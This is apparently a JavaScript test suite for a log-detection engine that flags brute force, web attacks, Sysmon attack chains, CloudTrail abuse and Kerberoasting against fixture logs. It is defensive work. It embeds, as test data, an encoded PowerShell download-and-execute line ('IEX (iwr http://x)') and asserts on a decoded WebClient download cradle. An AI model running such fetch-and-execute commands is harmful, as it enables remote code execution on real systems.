// Yoroi built-in detections (W.eng.detect) — port of Katana defense/detect.py.
const hunt = (name, th, off) => W.eng.detect.run(W.eng.logs.parse(fixture(name)).events, th, off);
const ids = (f) => new Set(f.map((x) => x.rule));

test("detect: catalog has all 25 detections with ATT&CK ids", () => {
  const c = W.eng.detect.catalog();
  assert.equal(c.length, 25);
  assert.equal(new Set(c.map((d) => d.id)).size, 25);
  for (const d of c) { assert.ok(d.name && d.desc && d.severity); assert.ok(d.attack.every((t) => /^T\d{4}(\.\d{3})?$/.test(t))); }
  assert.equal(W.eng.detect.DEFAULTS.brute_count, 10);
});

test("detect: auth.log — brute force, spray, success-after-brute, accounts, sudo, LOLBin", () => {
  const f = hunt("yoroi-auth.log");
  for (const r of ["AG-AUTH-001", "AG-AUTH-002", "AG-AUTH-003", "AG-AUTH-004", "AG-ACCT-001", "AG-ACCT-002", "AG-ACCT-003", "AG-EXE-002"]) assert.ok(ids(f).has(r), r);
  assert.equal(f[0].rule, "AG-AUTH-003"); assert.equal(f[0].severity, "critical");      // sorted by severity
  const bf = f.find((x) => x.rule === "AG-AUTH-001");
  assert.equal(bf.count, 18); assert.deepEqual(bf.entities.ip, ["203.0.113.50"]); assert.ok(bf.entities.user.includes("oracle"));
  assert.ok(f.find((x) => x.rule === "AG-ACCT-002").severity === "high");
  for (const x of f) { assert.equal(x.count, x.events.length); assert.ok(x.events.every(Number.isInteger)); }
});

test("detect: thresholds and disabled ids are honoured", () => {
  assert.ok(!ids(hunt("yoroi-auth.log", { brute_count: 50 })).has("AG-AUTH-001"));
  const f = hunt("yoroi-auth.log", null, ["AG-AUTH-001", "AG-AUTH-002"]);
  assert.ok(!ids(f).has("AG-AUTH-001") && !ids(f).has("AG-AUTH-002") && ids(f).has("AG-AUTH-003"));
  // off-hours: 2026-11-16 is a Monday; 03:00 is outside 07-19 but inside a 0-24 window
  const mon = W.eng.logs.parse("2026-11-16T03:00:00Z h sshd[1]: Accepted password for bob from 192.0.2.1 port 1 ssh2").events;
  assert.ok(ids(W.eng.detect.run(mon)).has("AG-AUTH-006"));
  assert.ok(!ids(W.eng.detect.run(mon, { business_start: 0, business_end: 24 })).has("AG-AUTH-006"));
  const sat = W.eng.logs.parse("2026-11-14T10:00:00Z h sshd[1]: Accepted password for bob from 192.0.2.1 port 1 ssh2").events;
  assert.ok(ids(W.eng.detect.run(sat)).has("AG-AUTH-006"));       // weekend
});

test("detect: web — attacks, scanners, 404 bursts, web shell", () => {
  const f = hunt("yoroi-access.log");
  for (const r of ["AG-WEB-001", "AG-WEB-002", "AG-WEB-003"]) assert.ok(ids(f).has(r), r);
  assert.equal(f.find((x) => x.rule === "AG-WEB-003").severity, "critical");
  assert.ok(f.some((x) => x.rule === "AG-WEB-001" && /SQL injection/.test(x.title) && x.severity === "high"));
  assert.ok(f.some((x) => x.rule === "AG-WEB-001" && /Log4Shell/.test(x.title)));
  assert.ok(f.some((x) => x.rule === "AG-WEB-002" && /40 × 404/.test(x.title)));
  assert.ok(f.some((x) => x.rule === "AG-WEB-002" && /nikto/.test(x.title)));
});

test("detect: Windows / Sysmon chain", () => {
  const f = hunt("yoroi-sysmon.xml");
  for (const r of ["AG-CRD-001", "AG-IMP-001", "AG-EVA-001", "AG-EXE-001", "AG-EXE-002", "AG-EXE-003", "AG-EXE-004", "AG-DIS-001", "AG-PER-001", "AG-AUTH-002"]) assert.ok(ids(f).has(r), r);
  const ps = f.find((x) => x.rule === "AG-EXE-001");
  assert.match(ps.detail, /Decoded: IEX \(New-Object Net\.WebClient\)\.DownloadString/);
  const lol = f.find((x) => x.rule === "AG-EXE-002");
  assert.deepEqual(lol.attack, ["T1105"]);
  assert.match(f.find((x) => x.rule === "AG-EXE-003").title, /winword\.exe → powershell\.exe/);
});

test("detect: encoded PowerShell in a syslog line is decoded", () => {
  const payload = W.b64(Uint8Array.from([..."IEX (iwr http://x)"].flatMap((c) => [c.charCodeAt(0), 0])));
  const evs = W.eng.logs.parse(`2026-11-14T10:00:00Z host1 powershell[1]: powershell.exe -nop -enc ${payload}`).events;
  const f = W.eng.detect.run(evs).filter((x) => x.rule === "AG-EXE-001");
  assert.ok(f.length); assert.ok(f[0].detail.includes("IEX (iwr http://x)"));
});

test("detect: CloudTrail + Kerberoasting + travel + lockouts", () => {
  const ct = hunt("yoroi-cloudtrail.json");
  const cl = ct.filter((x) => x.rule === "AG-CLD-001");
  assert.ok(cl.some((x) => /Root account console logon/.test(x.title)));
  assert.ok(cl.some((x) => /AdministratorAccess/.test(x.detail) && x.severity === "high"));
  assert.ok(cl.some((x) => /11 AccessDenied/.test(x.title)));
  assert.ok(ids(ct).has("AG-EVA-001"));      // StopLogging → log_clear
  const kr = hunt("yoroi-winevent.json").find((x) => x.rule === "AG-AUTH-008");
  assert.equal(kr.count, 3);                  // the DC1$ machine account ticket is ignored
  const tr = W.eng.logs.parse([
    "2026-11-14T10:00:00Z vpn sshd[1]: Accepted password for alice from 198.51.100.10 port 1 ssh2",
    "2026-11-14T10:20:00Z vpn sshd[2]: Accepted password for alice from 203.0.113.10 port 1 ssh2",
  ].join("\n")).events;
  assert.ok(ids(W.eng.detect.run(tr)).has("AG-AUTH-005"));
  const lo = W.eng.logs.parse(JSON.stringify([{ EventID: 4740, TargetUserName: "bob" }, { EventID: 4740, TargetUserName: "amy" }])).events;
  assert.equal(W.eng.detect.run(lo).find((x) => x.rule === "AG-AUTH-007").count, 2);
});

test("detect: quiet on benign logs and robust to junk", () => {
  const benign = W.eng.logs.parse([
    '2026-11-16T09:02:11Z web01 sshd[3100]: Accepted publickey for alice from 192.0.2.10 port 51234 ssh2',
    '192.0.2.15 - - [16/Nov/2026:10:05:00 +0000] "GET / HTTP/1.1" 200 9000 "-" "Mozilla/5.0"',
  ].join("\n"), "text").events;
  assert.deepEqual(W.eng.detect.run(benign).map((x) => x.rule), []);
  assert.deepEqual(W.eng.detect.run([]), []);
  assert.deepEqual(W.eng.detect.run(W.eng.logs.parse("\u0000\u0001 garbage ((( ]]]").events), []);
});
